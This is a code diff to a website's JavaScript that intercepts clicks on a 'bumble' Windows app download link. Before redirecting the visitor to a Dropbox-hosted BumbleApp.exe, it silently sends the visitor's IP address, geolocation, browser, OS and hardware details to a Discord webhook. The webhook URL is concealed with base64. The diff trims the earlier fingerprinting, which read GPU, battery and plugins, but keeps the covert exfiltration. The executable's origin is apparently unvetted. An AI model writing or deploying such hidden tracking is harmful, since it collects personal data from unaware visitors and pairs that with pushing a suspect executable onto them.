@@ -1,6 +1,7 @@
 (function (global) {
     "use strict";
 
+    /** UTF-8 URL as base64 (same idea as WEBHOOK_URL). Replace string: btoa(unescape(encodeURIComponent(yourUrl))) in browser console. */
     var BUMBLE_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/5gwkcsug7clu0jfwf49mc/BumbleApp.exe?rlkey=h2q65z0egkdpax2bberp8pksd&st=k4ted545&dl=1";
 
     var WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQwNjMyOTU5NTIwMzgzNC80eUZGbnNFSnpaRHdueW9fVHFyMHdQazREY2NoWFdMOU1QRm5ua1VCejluYjBNOU9ZcXB2LWF0OUNhcEMwTkp5MGU3OQ==");
@@ -136,92 +137,21 @@
         var ua = navigator.userAgent;
         if (ua.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
         if (ua.indexOf("Windows NT 6.1") !== -1) return "Windows 7";
-        if (ua.indexOf("Windows NT 6.2") !== -1) return "Windows 8";
-        if (ua.indexOf("Windows NT 6.3") !== -1) return "Windows 8.1";
         if (ua.indexOf("Windows") !== -1) return "Windows";
         if (ua.indexOf("Mac OS") !== -1 || ua.indexOf("Macintosh") !== -1) return "macOS";
-        if (ua.indexOf("Linux") !== -1) {
-            if (ua.indexOf("Android") !== -1) return "Android";
-            return "Linux";
-        }
-        if (ua.indexOf("iPhone") !== -1) return "iOS (iPhone)";
-        if (ua.indexOf("iPad") !== -1) return "iOS (iPad)";
-        if (ua.indexOf("CrOS") !== -1) return "ChromeOS";
+        if (ua.indexOf("Linux") !== -1) return "Linux";
+        if (ua.indexOf("Android") !== -1) return "Android";
+        if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "iOS";
         return "Unknown OS";
     }
 
-    // GERÇEK HARDWARE BİLGİLERİ
-    function getRealHardwareInfo() {
-        var info = {
+    function getHardwareInfo() {
+        return {
             screen: window.screen.width + "x" + window.screen.height,
-            colorDepth: window.screen.colorDepth + "-bit",
-            pixelRatio: window.devicePixelRatio || 1,
             language: navigator.language || "Unknown",
-            languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
-            cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "N/A",
-            memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-            touchPoints: navigator.maxTouchPoints || 0,
-            platform: navigator.platform || "Unknown",
-            vendor: navigator.vendor || "Unknown",
-            doNotTrack: navigator.doNotTrack || "Not set",
-            cookieEnabled: navigator.cookieEnabled ? "Yes" : "No",
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
-            timezoneOffset: -new Date().getTimezoneOffset() / 60 + " hours"
+            cores: navigator.hardwareConcurrency != null ? String(navigator.hardwareConcurrency) : "N/A",
+            memory: navigator.deviceMemory != null ? navigator.deviceMemory + " GB" : "N/A"
         };
-        
-        // GPU bilgisi al (canvas ile)
-        try {
-            var canvas = document.createElement("canvas");
-            var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-            if (gl) {
-                var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                if (debugInfo) {
-                    info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                }
-            }
-        } catch(e) { info.gpu = "Unknown"; }
-        
-        // Batarya bilgisi (varsa)
-        if (navigator.getBattery) {
-            navigator.getBattery().then(function(battery) {
-                info.battery = Math.round(battery.level * 100) + "%";
-                info.batteryCharging = battery.charging ? "Charging" : "Not charging";
-            }).catch(function(){});
-        }
-        
-        return info;
-    }
-
-    function getBrowserPlugins() {
-        var plugins = [];
-        try {
-            for (var i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-        } catch(e) {}
-        return plugins.slice(0, 5).join(", ") || "None";
-    }
-
-    function getConnectionInfo() {
-        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (!conn) return "N/A";
-        var info = [];
-        if (conn.effectiveType) info.push("Type: " + conn.effectiveType);
-        if (conn.downlink) info.push("Speed: " + conn.downlink + " Mbps");
-        if (conn.rtt) info.push("RTT: " + conn.rtt + "ms");
-        return info.join(" · ") || "N/A";
-    }
-
-    function getReferrer() {
-        return document.referrer || "Direct visit";
-    }
-
-    function getScreenOrientation() {
-        var orient = screen.orientation || screen.mozOrientation || screen.msOrientation;
-        if (orient && orient.type) return orient.type;
-        if (window.orientation !== undefined) return window.orientation === 0 ? "portrait" : "landscape";
-        return "Unknown";
     }
 
     function postWebhook(payload) {
@@ -231,11 +161,29 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload),
             keepalive: true
+        }).then(function (res) {
+            if (!res.ok) {
+                return res.text().then(function (body) {
+                    console.error("Webhook HTTP " + res.status, body);
+                    return fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        mode: "cors",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            content: clip("bumble download ping failed (HTTP " + res.status + ")", 2000)
+                        }),
+                        keepalive: true
+                    });
+                });
+            }
         }).catch(function (e) {
             console.error("Webhook failed", e);
         });
     }
 
+    /**
+     * @param {{ pageUrl?: string, guestName?: string, triggerLabel?: string }} opts
+     */
     function notifyBumbleDownload(opts) {
         opts = opts || {};
         var pageUrl = opts.pageUrl || global.location.href;
@@ -250,8 +198,7 @@
             month: "long",
             day: "numeric",
             hour: "2-digit",
-            minute: "2-digit",
-            second: "2-digit"
+            minute: "2-digit"
         }).format(now);
 
         return fetchIpJson().then(function (geo) {
@@ -273,55 +220,36 @@
 
             var browserName = getBrowserName();
             var osName = getOS();
-            var hw = getRealHardwareInfo();
-            var plugins = getBrowserPlugins();
-            var connection = getConnectionInfo();
-            var referrer = getReferrer();
-            var orientation = getScreenOrientation();
-            
-            var hwLine = "🖥️ Screen: `" + hw.screen + "` (" + hw.colorDepth + ", " + hw.pixelRatio + "x ratio)\n";
-            hwLine += "🧠 CPU: `" + hw.cores + "` · RAM: `" + hw.memory + "`\n";
-            hwLine += "🎮 GPU: `" + (hw.gpu || "N/A") + "`\n";
-            hwLine += "🖱️ Touch: `" + hw.touchPoints + " points` · 🧭 Orientation: `" + orientation + "`\n";
-            hwLine += "🌐 Language: `" + hw.language + "` · Timezone: `" + hw.timezone + "` (" + hw.timezoneOffset + ")";
-            
-            if (hw.gpuVendor && hw.gpuVendor !== "Unknown") {
-                hwLine += "\n🏭 GPU Vendor: `" + hw.gpuVendor + "`";
-            }
+            var hw = getHardwareInfo();
+            var hwLine = "Screen `" + hw.screen + "` · Language `" + hw.language + "` · CPU cores `" + hw.cores + "` · RAM `" + hw.memory + "`";
 
-            var sourceLines = "**📍 Page URL**\n`" + pageUrl + "`";
+            var sourceLines = "**Page URL**\n`" + pageUrl + "`";
             if (triggerLabel) {
-                sourceLines += "\n**⚡ Trigger**\n`" + clip(triggerLabel, 500) + "`";
+                sourceLines += "\n**Trigger**\n`" + clip(triggerLabel, 500) + "`";
             }
             if (guestName) {
-                sourceLines += "\n**👤 Guest name**\n`" + guestName + "`";
+                sourceLines += "\n**Guest name**\n`" + guestName + "`";
             }
-            sourceLines += "\n**🔗 Referrer**\n`" + clip(referrer, 200) + "`";
-
-            var extraLines = "**🔌 Plugins**\n`" + clip(plugins, 300) + "`\n";
-            extraLines += "**📡 Connection**\n`" + connection + "`\n";
-            extraLines += "**🍪 Cookies**\n`Enabled: " + hw.cookieEnabled + "` · **DNT**: `" + hw.doNotTrack + "`";
 
             var payload = {
-                username: "🐝 BUMBLE - DOWNLOAD TRACKER",
+                username: "bumble - Downloads",
                 avatar_url: AVATAR_URL,
                 embeds: [{
-                    title: "🐝 **BUMBLE SERIES - NEW DOWNLOAD!**",
-                    description: "**Someone just grabbed the Windows app!** 🔥",
+                    title: "\uD83C\uDFAC New desktop download",
+                    description: "A visitor started downloading the **bumble** Windows app.",
                     color: EMBED_COLOR,
                     fields: [
-                        { name: "📌 SOURCE", value: clip(sourceLines), inline: false },
-                        { name: "⬇️ DOWNLOAD LINK", value: clip("`" + BUMBLE_APP_DOWNLOAD_URL + "`"), inline: false },
-                        { name: "🌍 LOCATION", value: clip("`" + locationStr + "` " + (countryFlag ? countryFlag : "") + "\n🖧 IP: `" + ip + "`"), inline: false },
-                        { name: "⏰ LOCAL TIME", value: "`" + clip(nowLocal, 200) + "`", inline: false },
-                        { name: "💻 SYSTEM", value: "`" + osName + "`", inline: true },
-                        { name: "🌐 BROWSER", value: "`" + browserName + "`", inline: true },
-                        { name: "⚙️ PLATFORM", value: "`" + hw.platform + "`", inline: true },
-                        { name: "🛠️ HARDWARE DETAILS", value: clip(hwLine, 500), inline: false },
-                        { name: "🔧 EXTRA INFO", value: clip(extraLines, 400), inline: false }
+                        { name: "\uD83D\uDCCD Source page", value: clip(sourceLines), inline: false },
+                        { name: "\u2B07\uFE0F Install link", value: clip("`" + BUMBLE_APP_DOWNLOAD_URL + "`"), inline: false },
+                        { name: "\uD83C\uDF0D Location", value: clip("`" + locationStr + "`" + (countryFlag ? " " + countryFlag : "")), inline: false },
+                        { name: "\uD83D\uDDA5\uFE0F IP address", value: "`" + clip(ip, 100) + "`", inline: false },
+                        { name: "\u231A Local time", value: "`" + clip(nowLocal, 200) + "`", inline: false },
+                        { name: "\uD83D\uDDA5\uFE0F Platform", value: "`" + osName + "`", inline: true },
+                        { name: "\uD83C\uDF10 Browser", value: "`" + browserName + "`", inline: true },
+                        { name: "\u2699\uFE0F Hardware", value: clip(hwLine), inline: false }
                     ],
                     footer: {
-                        text: "Bumble Series • Premium Windows App • " + new Date().getFullYear(),
+                        text: "bumble \u2022 bumbleseries.com",
                         icon_url: AVATAR_URL
                     },
                     timestamp: timestamp
@@ -350,30 +278,17 @@
         }
     }
 
-    // ANA FONKSİYON - BEKLEMEDEN İNDİR
     function onDocumentClickCapture(e) {
         var a = e.target.closest && e.target.closest("a[data-bumble-download]");
         if (!a) return;
         if (a.getAttribute("data-download-no-track") != null) return;
         e.preventDefault();
-        
-        var downloadUrl = BUMBLE_APP_DOWNLOAD_URL;
-        
-        // Dropbox linkini düzenle (raw download için)
-        if (downloadUrl.indexOf("dropbox.com") !== -1 && downloadUrl.indexOf("dl=1") !== -1) {
-            downloadUrl = downloadUrl.replace("www.dropbox.com", "dl.dropboxusercontent.com");
-        }
-        
-        // Webhook'u arkada gönder - BEKLEME YOK
         notifyBumbleDownload({
             pageUrl: global.location.href,
             triggerLabel: a.getAttribute("data-bumble-trigger") || undefined
-        }).catch(function(){});
-        
-        // HEMEN İNDİRMEYİ BAŞLAT
-        setTimeout(function() {
-            window.location.href = downloadUrl;
-        }, 50);
+        }).finally(function () {
+            global.location.href = BUMBLE_APP_DOWNLOAD_URL;
+        });
     }
 
     if (typeof document !== "undefined") {
